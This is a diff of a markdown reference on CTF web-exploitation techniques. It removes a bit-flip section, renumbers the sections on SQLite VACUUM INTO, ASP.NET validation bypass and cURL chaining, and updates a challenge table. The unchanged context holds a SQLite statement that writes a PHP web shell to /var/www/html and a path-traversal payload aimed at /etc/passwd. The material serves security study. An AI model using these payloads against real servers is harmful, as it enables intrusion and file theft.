@@ -649,30 +649,7 @@ sh g        # execute the assembled command in file "g"
 - Multiple command invocations are possible (e.g., repeated HTTP requests)
 - The filesystem is writable and listable
 
-### 4.2 Single Bit-Flip Source Code Corruption
-
-**What is manipulated**: Given the ability to flip exactly *one* bit in one byte of a source code file, achieve RCE by strategically corrupting the interpreter's source.
-
-**HITCON CTF 2021 "One-Bit Man"**: Flip one bit in any PHP file under `/var/www/html/` (WordPress installation).
-
-```
-Attack model:
-  Input: (filename, byte_offset, bit_position 0-7)
-  Effect: XOR one bit at the specified location
-  Constraint: Exactly ONE bit flip total
-
-Strategy:
-  1. Identify a PHP file where a single character change creates an exploitable condition
-  2. Map ASCII characters to their 1-bit-flip neighbors:
-     '=' (0x3D) → flip bit 5 → ']' (0x5D) — breaks comparison
-     'i' (0x69) → flip bit 5 → 'I' (0x49) — changes function name
-     '0' (0x30) → flip bit 0 → '1' (0x31) — changes boolean/number
-  3. Find the exact byte in WordPress where this creates auth bypass or code injection
-```
-
-**Real-world applicability**: Rowhammer attacks, cosmic ray bit flips in memory, and hardware fault injection all produce single-bit corruption. Understanding which bit flips in which files create exploitable conditions is directly relevant to fault analysis.
-
-### 4.3 SQLite `VACUUM INTO` as File-Write Primitive
+### 4.2. SQLite `VACUUM INTO` as File-Write Primitive
 
 **What is manipulated**: SQLite's `VACUUM INTO('path')` command dumps the entire database contents into a new file at an arbitrary path — converting SQL injection into arbitrary file write.
 
@@ -697,7 +674,7 @@ INSERT INTO t VALUES('');VACUUM INTO('f.php')
 
 **Variant — SQLite `ATTACH DATABASE`**: Similar file-write primitive: `ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.x(d TEXT); INSERT INTO pwn.x VALUES('<?php system($_GET["c"]); ?>');`
 
-### 4.4 TCP Port Reflection for Eval Injection
+### 4.3 TCP Port Reflection for Eval Injection
 
 **What is manipulated**: When a server-side application scans TCP ports and evaluates responses, the attacker finds or creates a service that echoes back attacker-controlled data in the expected format.
 
@@ -711,13 +688,13 @@ Attack:
   4. Server eval()s the reflected PHP code → RCE
 ```
 
-### 4.5 Apache `mod_negotiation` Content-Type Bypass
+### 4.4 Apache `mod_negotiation` Content-Type Bypass
 
 **What is manipulated**: Apache's MultiViews content negotiation serves files with inferred Content-Types that differ from the upload directory's restrictions.
 
 **HITCON CTF 2020 "oStyle"**: Upload directory has `php_flag engine off` (no PHP execution). But `mod_negotiation` with `MultiViews` enabled allows Apache to serve an uploaded `.html` file with `text/html` Content-Type based on content negotiation, bypassing the "no execution" restriction and enabling stored XSS.
 
-### 4.6 ASP.NET Request Validation as Security Check Bypass
+### 4.5 ASP.NET Request Validation as Security Check Bypass
 
 **What is manipulated**: ASP.NET's Request Validation throws exceptions on inputs containing `<`, `>`, etc. If error handling swallows this exception, security checks in the same try block are skipped.
 
@@ -737,7 +714,7 @@ if (!isBad) {
 
 **Payload**: `filename=..\..\etc\passwd<` — the `<` triggers Request Validation exception before the `..` check executes, so `isBad` stays `false`.
 
-### 4.7 cURL Config File Chaining for Raw TCP
+### 4.6 cURL Config File Chaining for Raw TCP
 
 **What is manipulated**: When `gopher://` is unavailable, cURL's `--config` (`-K`) option chains multiple cURL invocations through config files to achieve raw TCP communication.
 
@@ -923,12 +900,11 @@ add_header Content-Security-Policy "frame-ancestors 'none'" always;
 | **Google CTF** | 2025 | Postviewer v5 | PRNG state recovery from base36-encoded partial output via Z3 | §2.5 |
 | **Google CTF** | 2024 | Grand Prix Heaven | Regex `[A-z]` range includes `[\]^_\`` — path validation bypass | §3.3 |
 | **HITCON CTF** | 2024 | HTML Upload | Chunked encoding differential: validator processes entire file, browser processes chunk-by-chunk with different encoding per chunk | §3.4 |
-| **HITCON CTF** | 2025 | Pholyglot | SQLite `VACUUM INTO` file write from 30-char SQL injection window | §4.3 |
-| **HITCON CTF** | 2025 | No Man's Echo | TCP port reflection for eval injection — echo service as code delivery | §4.4 |
-| **HITCON CTF** | 2021 | One-Bit Man | Single bit-flip source code corruption → PHP auth bypass | §4.2 |
+| **HITCON CTF** | 2025 | Pholyglot | SQLite `VACUUM INTO` file write from 30-char SQL injection window | §4.2 |
+| **HITCON CTF** | 2025 | No Man's Echo | TCP port reflection for eval injection — echo service as code delivery | §4.3 |
 | **HITCON CTF** | 2021 | Vulpixelize | Chrome Text Fragment pixel side-channel through extreme downsampling | §5.4 |
-| **HITCON CTF** | 2020 | oStyle | Apache `mod_negotiation` MultiViews Content-Type bypass | §4.5 |
-| **HITCON CTF** | 2019 | Buggy .Net | ASP.NET Request Validation exception swallows security checks | §4.6 |
+| **HITCON CTF** | 2020 | oStyle | Apache `mod_negotiation` MultiViews Content-Type bypass | §4.4 |
+| **HITCON CTF** | 2019 | Buggy .Net | ASP.NET Request Validation exception swallows security checks | §4.5 |
 | **HITCON CTF** | 2017 | Babyfirst Revenge | Filesystem-as-command-assembler — 5-byte/4-byte RCE | §4.1 |
 | **PlaidCTF** | 2025 | Tales from the Crypt | Corrupted RSA key recovery via Coppersmith's method → TLS session decryption from pcap | §2.3.2 |
 | **DiceCTF** | 2024 | another-csp | Browser crash (`color-mix` bug) as 1-bit oracle for token extraction | §5.1 |
@@ -936,7 +912,7 @@ add_header Content-Security-Policy "frame-ancestors 'none'" always;
 | **DiceCTF** | 2023 | impossible-xss | XSLT/XXE in browser with JS disabled — bypasses CSP and `setJavaScriptEnabled(false)` | §5.3 |
 | **DiceCTF** | 2023 | jnotes | Jetty cookie parser quote smuggling — absorbs HttpOnly cookie into reflected value | §5.5 |
 | **DiceCTF** | 2023 | codebox | CSP `report-uri` as exfiltration channel via Trusted Types violation | §5.8 |
-| **DiceCTF** | 2023 | unfinished | cURL config file chaining for raw TCP (SSRF to MongoDB without gopher) | §4.7 |
+| **DiceCTF** | 2023 | unfinished | cURL config file chaining for raw TCP (SSRF to MongoDB without gopher) | §4.6 |
 | **DiceCTF** | 2022 | shadow | Closed Shadow DOM breach via `-webkit-user-modify` + `window.find()` | §5.2 |
 | **DiceCTF** | 2022 | blazingfast | Unicode case-folding length confusion in WASM (`ß` → `SS` expansion) | §5.9 |
 | **corCTF** | 2024 | iframe-note | bfcache weaponization — back-navigation replays poisoned response | §5.7 |
